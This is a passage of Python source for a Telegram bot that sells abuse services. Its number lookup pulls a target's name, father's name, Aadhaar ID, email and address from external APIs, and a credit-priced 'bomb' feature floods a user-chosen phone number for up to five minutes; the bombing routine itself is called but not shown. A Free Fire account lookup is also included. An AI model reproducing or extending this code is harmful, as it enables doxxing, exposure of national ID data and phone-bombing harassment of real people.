        result = "━━━━━━━━ 𝐍𝐚𝐦𝐞 𝐀𝐏𝐈 𝐑𝐞𝐬𝐮𝐥𝐭 ━━━━━━━━\n🌐 𝐍𝐚𝐦𝐞  : **NO RESULT FOUND**\n━━━━━━━━━ 𝐍𝐮𝐦𝐛𝐞𝐫 𝐈𝐧𝐟𝐨 ━━━━━━━━━\n⚠️ **NO RESULT FOUND**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        msg = await event.reply(result, parse_mode='markdown')
        warn = await event.respond("⚠️ Self-destruct in 15s")
        asyncio.create_task(delete_15sec(msg))
        asyncio.create_task(delete_15sec(warn))
        return
    wait = await event.reply("📡 **Fetching Info...**", parse_mode='markdown')
    multiple_results = []
    try:
        res = requests.get(NUM_API.format(num), timeout=10).json()
        for k, v in res.items():
            if k.isdigit(): multiple_results.append(v)
    except: pass
    name_from_api = None
    try:
        clean = '91' + num if not num.startswith('91') else num
        name_res = requests.get(f"https://number-to-name-ten.vercel.app/info?name={clean}", timeout=5).json()
        name_from_api = name_res.get("name")
    except: pass
    if not name_from_api:
        try:
            clean2 = num[2:] if num.startswith('91') else num
            name_res2 = requests.get(f"https://number-to-name-ten.vercel.app/info?name={clean2}", timeout=5).json()
            name_from_api = name_res2.get("name")
        except: pass
    if multiple_results:
        result = f"━━━━━━━━━🕸️ 𝐒𝐏𝐈𝐃𝐄𝐘 🕸️━━━━━━━━━\n━━━━━━━━ 𝐍𝐚𝐦𝐞 𝐀𝐏𝐈 𝐑𝐞𝐬𝐮𝐥𝐭 ━━━━━━━━\n🌐 𝐍𝐚𝐦𝐞  : {name_from_api if name_from_api else 'Not Found'}\n━━━━━━━━━ 𝐍𝐮𝐦𝐛𝐞𝐫 𝐈𝐧𝐟𝐨 ━━━━━━━━━"
        for idx, d in enumerate(multiple_results, 1):
            result += f"\n📄 Result #{idx}\n📞 Number: {d.get('MOBILE', num)}\n👤 Name: {d.get('NAME', 'NA')}\n🧔 Father: {d.get('fname', 'NA')}\n📞 Alt: {d.get('alt') or 'NA'}\n📡 Area: {d.get('circle', 'NA')}\n🆔 Aadhaar: {d.get('id', 'NA')}\n📧 Email: {d.get('email', 'NA')}\n🏙️ Address: {d.get('ADDRESS', 'NA')}"
        result += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n @HloSpidey @SpideyStuff 🕸️❤️‍🔥\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    else:
        if name_from_api:
            result = f"━━━━━━━━━🕸️ 𝐒𝐏𝐈𝐃𝐄𝐘 🕸️━━━━━━━━━\n━━━━━━━━ 𝐍𝐚𝐦𝐞 𝐀𝐏𝐈 𝐑𝐞𝐬𝐮𝐥𝐭 ━━━━━━━━\n🌐 𝐍𝐚𝐦𝐞  : {name_from_api}\n━━━━━━━━━ 𝐍𝐮𝐦𝐛𝐞𝐫 𝐈𝐧𝐟𝐨 ━━━━━━━━━\n⚠️ **API ERROR 404**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        else:
            result = "━━━━━━━━ 𝐍𝐚𝐦𝐞 𝐀𝐏𝐈 𝐑𝐞𝐬𝐮𝐥𝐭 ━━━━━━━━\n🌐 𝐍𝐚𝐦𝐞  : **NO RESULT FOUND**\n━━━━━━━━━ 𝐍𝐮𝐦𝐛𝐞𝐫 𝐈𝐧𝐟𝐨 ━━━━━━━━━\n⚠️ **NO RESULT FOUND**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    await wait.delete()
    msg = await event.reply(result, parse_mode='markdown')
    warn = await event.respond("⚠️ Self-destruct in 15s")
    asyncio.create_task(delete_15sec(msg))
    asyncio.create_task(delete_15sec(warn))

@client.on(events.NewMessage(pattern=r"(?i)/ff"))
async def ff_cmd(event):
    user_id = event.sender_id
    add_user(user_id)
    can, rem = await check_rate_limit(user_id, "ff")
    if not can:
        cd = await event.reply(f"⏰ Wait **{rem}** seconds!", parse_mode='markdown')
        for i in range(rem, 0, -1):
            await asyncio.sleep(1)
            try:
                if i-1 > 0: await cd.edit(f"⏰ Wait **{i-1}** seconds!", parse_mode='markdown')
                else: await cd.delete()
            except: break
        return
    args = event.raw_text.split()
    if len(args) > 1:
        await process_ff(event, args[1])
        return
    user_state[user_id] = {"type": "ff", "attempts": 0}
    msg = await event.reply("🎮 **Send Free Fire UID**\nExample: `1234567890`", parse_mode='markdown')
    asyncio.create_task(auto_delete(msg, 60))
    await asyncio.sleep(60)
    if user_id in user_state and user_state[user_id].get("type") == "ff":
        del user_state[user_id]
        await event.reply("⏰ Timeout! Send `/ff` again.", parse_mode='markdown')

async def process_ff(event, uid):
    user_id = event.sender_id
    can, rem = await check_rate_limit(user_id, "ff")
    if not can:
        cd = await event.reply(f"⏰ Wait **{rem}** seconds!", parse_mode='markdown')
        for i in range(rem, 0, -1):
            await asyncio.sleep(1)
            try:
                if i-1 > 0: await cd.edit(f"⏰ Wait **{i-1}** seconds!", parse_mode='markdown')
                else: await cd.delete()
            except: break
        return
    uid = re.sub(r'\D', '', uid)
    if not uid.isdigit() or not (8 <= len(uid) <= 13):
        att = user_state.get(user_id, {}).get("attempts", 0) + 1
        user_state[user_id] = {"type": "ff", "attempts": att}
        if att >= 3:
            await delete_waiting_message(user_id)
            msg = await event.reply("❌ **Invalid UID!**\nSend `/ff 1234567890`", parse_mode='markdown')
            asyncio.create_task(auto_delete(msg, 15))
            del user_state[user_id]
        else:
            msg = await event.reply(f"⚠️ **Invalid!** ({att}/3)\nSend valid UID.", parse_mode='markdown')
            user_waiting_messages[user_id] = msg
            asyncio.create_task(auto_delete(msg, 15))
        return
    if user_id in user_state: del user_state[user_id]
    await update_rate_limit(user_id, "ff")
    if is_ff_protected(uid):
        await event.reply("⚠️ **NO RESULT FOUND**", parse_mode='markdown')
        return
    wait = await event.reply("🎮 **Fetching FF Info...**", parse_mode='markdown')
    try:
        res = requests.get(FF_API.format(uid), timeout=10).json()
        if not res.get("success"):
            await wait.edit("⚠️ **NO RESULT FOUND**", parse_mode='markdown')
            asyncio.create_task(auto_delete(wait, 15))
            return
        d = res["data"]
        prime = d.get("🗿 Prime Level", "") or d.get("🥇 Prime", "")
        prime_match = re.search(r'^(\d+)', str(prime)) if prime else None
        prime_level = prime_match.group(1) if prime_match else "N/A"
        likes_raw = d.get("👍 Likes", "")
        likes_match = re.search(r'^(\d+)', str(likes_raw)) if likes_raw else None
        likes = likes_match.group(1) if likes_match else "N/A"
        result = f"━━━━━━━🎮 𝗙𝗿𝗲𝗲 𝗙𝗶𝗿𝗲 𝗜𝗻𝗳𝗼 🎮━━━━━━━\n\n🆔 UID: {d.get('🆔 ID', 'N/A')}\n📅 Created: {format_date(d.get('📅 Account Created'))}\n🌍 Region: {d.get('🌎 Region', 'N/A')}\n👤 Name: {d.get('👤 Nickname', 'N/A')}\n🎖️ Level: {d.get('🎖️ Level', 'N/A')}\n📈 EXP: {d.get('📈 Experience (XP)', 'N/A')}\n🏅 Rank Points: {d.get('🏆 Ranked Points', 'N/A')}\n🗿 Prime Level: {prime_level}\n👍 Likes: {likes}\n⏳ Last Login: {format_date(d.get('🕒 Last Login'))}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n @HloSpidey @SpideyStuff 🕸️\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        await wait.edit(result, parse_mode='markdown')
    except:
        await wait.edit("⚠️ **API Error**", parse_mode='markdown')
        asyncio.create_task(auto_delete(wait, 15))

@client.on(events.NewMessage)
async def handler(event):
    user_id = event.sender_id
    if event.text and event.text.startswith('/'): return
    if user_id in user_state:
        state = user_state[user_id]
        if state["type"] == "num": await process_number(event, event.text)
        elif state["type"] == "ff": await process_ff(event, event.text)
        elif state["type"] == "bomb":
            del user_state[user_id]
            phone = extract_number(event.text)
            if not phone: return await event.reply("❌ **Invalid number!** Send 10-digit number.", parse_mode='markdown')
            buttons = [
                [Button.inline("6 sec 💣 (2💎)", f"bomb_6_{phone}"), Button.inline("15 sec 💣 (4💎)", f"bomb_15_{phone}")],
                [Button.inline("45 sec 💣 (10💎)", f"bomb_45_{phone}"), Button.inline("5 min 💣 (50💎)", f"bomb_300_{phone}")],
                [Button.inline("🎁 Earn Free Credits", "earn_credits")]
            ]
            await event.reply(f"📱 Number: `{phone}`\n👤 By: {event.sender.first_name}\n💎 Credits: {user_credits.get(user_id, 5)}\n\nSelect duration:", buttons=buttons, parse_mode='markdown')
        elif state["type"] == "vnum":
            del user_state[user_id]
            await process_vehicle(event, event.text)

@client.on(events.CallbackQuery)
async def callback_handler(event):
    data = event.data.decode()
    user_id = event.sender_id
    if data == "cancel_broadcast":
        global broadcast_active, broadcast_waiting
        if event.sender_id != ADMIN_ID: return await event.answer("❌ Not authorized", alert=True)
        broadcast_active = False
        broadcast_waiting = False
        await event.answer("✅ Cancelled!")
        await event.edit("🚫 Broadcast cancelled")
    elif data == "earn_credits":
        await get_credits_cmd(event)
    elif data.startswith("cancel_bomb"):
        uid = int(data.split("_")[-1])
        if user_id == uid:
            bombing_active[uid] = False
            await event.answer("🔴 Bombing cancelled!", alert=True)
    elif data.startswith("choose_again"):
        uid = int(data.split("_")[-1])
        if user_id == uid:
            await bomb_cmd(event)
    elif data == "verify_credits":
        try:
            member5 = await client.get_permissions(int(CLAIM_5_LINK.split('/')[-1]), user_id) if CLAIM_5_LINK else False
            member3 = await client.get_permissions(int(CLAIM_3_LINK.split('/')[-1]), user_id) if CLAIM_3_LINK else False
        except: member5 = member3 = False
        added = False
        if member5 and not user_claimed[user_id]['v1']:
            user_claimed[user_id]['v1'] = True
            user_credits[user_id] = user_credits.get(user_id, 5) + 5
            added = True
        if member3 and not user_claimed[user_id]['v2']:
            user_claimed[user_id]['v2'] = True
            user_credits[user_id] = user_credits.get(user_id, 5) + 3
            added = True
        if added:
            await update_users_list_msg()
            await event.edit(f"✅ **Credits Added!**\nBalance: {user_credits[user_id]}💎", parse_mode='markdown')
        else:
            await event.answer("Already claimed or not joined!", alert=True)
    elif data.startswith("bomb_"):
        parts = data.split('_')
        duration = int(parts[1])
        phone = parts[2]
        cost = {6:2, 15:4, 45:10, 300:50}[duration]
        if not deduct_credit(user_id, cost):
            return await event.answer("❌ Insufficient credits! Send /GetCredits", alert=True)
        await event.edit("💣 **Starting bombing...**", parse_mode='markdown')
        await perform_bombing(user_id, phone, event, event.message_id, duration, cost)

async def main():
    await load_admin_data()
    await load_users_data()
    await load_users_list()
    print('Bot running successfully')
    await client.run_until_disconnected()

with client:
    client.loop.run_until_complete(main())
